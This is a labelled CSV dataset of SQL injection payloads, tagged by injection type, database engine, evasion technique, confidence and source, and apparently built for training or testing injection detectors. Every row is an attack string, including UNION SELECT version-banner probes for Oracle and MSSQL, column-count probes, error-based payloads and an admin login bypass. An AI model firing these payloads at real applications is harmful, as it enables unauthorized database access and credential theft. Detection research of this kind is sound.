payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"select * from users where id = '1' union select null,banner from v$version where rownum = 1 -- 1'",union_based,oracle,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' union select @ @1,version ( ) -- 1'",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = '1' union select ""[""_,version ( ) -- 1'",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#""$ union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#""$ union select version ( ) ,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#""$ union select 'a',version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#""$ union select null,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = '1' + ( \ ) union select 1,@@VERSION -- 1'",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' + ( \. ) union select 1,@@VERSION -- 1'",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' * ( 1 ) union select 1,banner from v$version where rownum = 1 -- 1'",union_based,oracle,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1'<@.. union select 1,version ( ) -- 1'",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = '1' <@._ union select 1,version ( ) -- 1'",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = '1' + 1||1 union select 1,banner from v$version where rownum = 1 -- 1'",union_based,oracle,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' *1 union select 1,banner from v$version where rownum = 1 -- 1'",union_based,oracle,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' + @<@# union select 1,version ( ) -- 1'",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = '1' + $ . union select 1,@@VERSION -- 1'",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' <@$_ union select 1,version ( ) -- 1'",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = '1' <@&1 union select 1,version ( ) -- 1'",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = '1' <@<@ union select 1,version ( ) -- 1'",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = '1' + $+*$ union select 1,@@VERSION -- 1'",union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
"select * from users where id = '1' %!<@ union select 1,version ( ) -- 1'",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = '1'<@$$ union select 1,version ( ) -- 1'",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = '1' + @ ( 1 ) union select 1,version ( ) -- 1'",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = '1' + @ 1 union select 1,version ( ) -- 1'",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = '1' + @ 1! union select 1,version ( ) -- 1'",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = '1' + @ @1 union select 1,version ( ) -- 1'",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#""@ union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#""@ union select version ( ) ,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#""@ union select 'a',version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#""@ union select null,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#""{ union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#""{ union select version ( ) ,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#""{ union select 'a',version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or 1#""{ union select null,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 or @#""{ = 1 union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 + @`\` union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 + @<1# union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 + @<@. union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 -@<@ union select 1,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 -@<@ union select version ( ) ,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 -@<@ union select null,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"select * from users where id = 1 + @<@# union select null,version ( ) -- 1",union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"1234 ' AND 1 = 0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",union_based,unknown,case_variation,0.7,rule,sqliv5_csv,string_single_quote
"1234 "" AND 1 = 0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",union_based,unknown,case_variation,0.7,rule,sqliv5_csv,string_double_quote
' UNION ALL SELECT,union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
UNION ALL SELECT,union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
union all select @@version--,union_based,mssql,case_variation,0.46,rule,sqliv5_csv,unknown
union select,union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
union select * from users where login = char ...,union_based,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
"-4860' ) as azyx where 6901 = 6901 union all select 6901,6901,6901,6901,6901#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1%' ) ) union all select null,null,null,null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-4925"" union all select 5686,5686,5686,5686,5686,5686,5686#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-3794' ) union all select 2485,2485,2485,2485,2485--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-6400 ) ) union all select 4650,4650,4650--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) where 9842 = 9842 union all select null,null,null,null,null,null,null,null#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
-5021'+ ( select yadq where 4285 = 4285 order by 1#,union_based,unknown,case_variation,0.7,rule,sqliv2_csv,order_by
"-9508 ) union all select 9950,9950,9950,9950,9950,9950,9950#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) as ekjw where 5477 = 5477 union all select null,null,null,null,null--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-4605"" ) union all select 8542,8542,8542,8542,8542,8542,8542,8542--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-2312' ) ) ) union all select 5282,5282,5282,5282,5282,5282,5282,5282--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-8153' ) as qhlb where 4948 = 4948 union all select 4948,4948,4948,4948,4948,4948#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-5139 ) ) union all select 3373,3373,3373,3373,3373,3373,3373,3373#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
-9446 ) ) as wmrq where 3705 = 3705 union all select 3705#,union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1"" ) ) union all select null,null,null,null,null,null,null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1"" ) ) as lomw where 9257 = 9257 union all select null,null,null,null,null,null--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1'+ ( select syrz where 7699 = 7699 union all select null,null,null#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-4984%"" ) ) ) union all select 6980,6980,6980,6980,6980,6980,6980,6980#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-5224' ) where 1962 = 1962 union all select 1962,1962,1962,1962,1962,1962,1962,1962,1962--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1"" ) ) ) union all select null,null,null,null,null--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ( 'ejul' = 'ejul",union_based,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
"-3721' ) union all select 9050,9050--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
1%' ) order by 1--,union_based,unknown,,0.8,rule,sqliv2_csv,order_by
"-9087"" order by 1#",union_based,unknown,,0.8,rule,sqliv2_csv,order_by
"1"" ) as duvm where 6190 = 6190 order by 1--",union_based,unknown,,0.7,rule,sqliv2_csv,order_by
"-7371' ) union all select 4531,4531,4531#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' union all select null,null,null,null--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-3596' ) union all select 5349,5349,5349,5349,5349,5349#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%' ) ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( ( '%' = '",union_based,unknown,case_variation|hex_string,0.8,rule,sqliv2_csv,unknown
1' ) where 6622 = 6622 order by 1--,union_based,unknown,,0.7,rule,sqliv2_csv,order_by
"-7813"" ) ) as yvyl where 5172 = 5172 union all select 5172,5172#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-9795 ) as wrgs where 5427 = 5427 union all select 5427,5427,5427,5427,5427,5427--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
-6637' ) ) order by 1#,union_based,unknown,,0.8,rule,sqliv2_csv,order_by
"1'+ ( select 'rryx' where 1228 = 1228 union all select null,null,null,null,null,null,null,null,null#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1 ) as biup where 1414 = 1414 union all select null,null,null,null,null,null,null,null#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-5827"" ) as lskq where 7683 = 7683 union all select 7683,7683,7683,7683,7683#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-3697' ) ) ) union all select 5180,5180,5180,5180,5180,5180,5180--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-9514 ) ) as xdkw where 4975 = 4975 union all select 4975,4975,4975,4975#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"1 union all select null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1'|| ( select 'wyng' from dual where 2157 = 2157 union all select null,null--",union_based,oracle,case_variation,0.41,rule,sqliv2_csv,unknown
"-1065 ) ) union all select 7437,7437,7437,7437,7437,7437,7437,7437--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' ) where 6672 = 6672 union all select null,null,null,null,null,null,null,null,null,null--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-3391' union all select 2024,2024--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-3829%"" ) union all select 2218,2218,2218,2218,2218,2218,2218--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-8629 where 8049 = 8049 union all select 8049,8049,8049,8049,8049,8049,8049#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-3279"" union all select 8568,8568,8568,8568--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
-3598 ) union all select 2264#,union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-8982' in boolean mode ) union all select 5367,5367,5367,5367,5367,5367#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1' where 7104 = 7104 union all select null,null,null,null,null,null,null#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
1%' order by 1#,union_based,unknown,,0.8,rule,sqliv2_csv,order_by
"-1184"" ) ) ) union all select 1482--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-6158"" ) union all select 3084,3084,3084,3084,3084,3084#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-9859"" ) ) ) union all select 6595,6595,6595,6595,6595,6595,6595#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-2319 union all select 5068,5068,5068#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-9656"" union all select 8735,8735--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-5859 ) as ernq where 8394 = 8394 union all select 8394,8394,8394--",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
"-4076' ) ) union all select 9030,9030,9030,9030,9030,9030,9030,9030,9030,9030--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-8950"" ) ) as uahs where 2113 = 2113 union all select 2113,2113,2113,2113,2113,2113,2113,2113,2113,2113#",union_based,unknown,case_variation,0.7,rule,sqliv2_csv,unknown
-9826 where 4103 = 4103 order by 1#,union_based,unknown,,0.7,rule,sqliv2_csv,order_by
"1' union all select null,null,null--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1 ) union all select null,null,null,null,null,null,null,null,null,null--",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-4817 union all select 7415,7415,7415,7415,7415,7415,7415,7415,7415#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1 union all select null,null,null,null,null,null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"1%' ) ) ) union all select null,null,null,null#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-3933' ) ) ) union all select 6198,6198,6198,6198,6198#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
"-3361 ) ) union all select 2827,2827,2827,2827#",union_based,unknown,case_variation,0.8,rule,sqliv2_csv,unknown
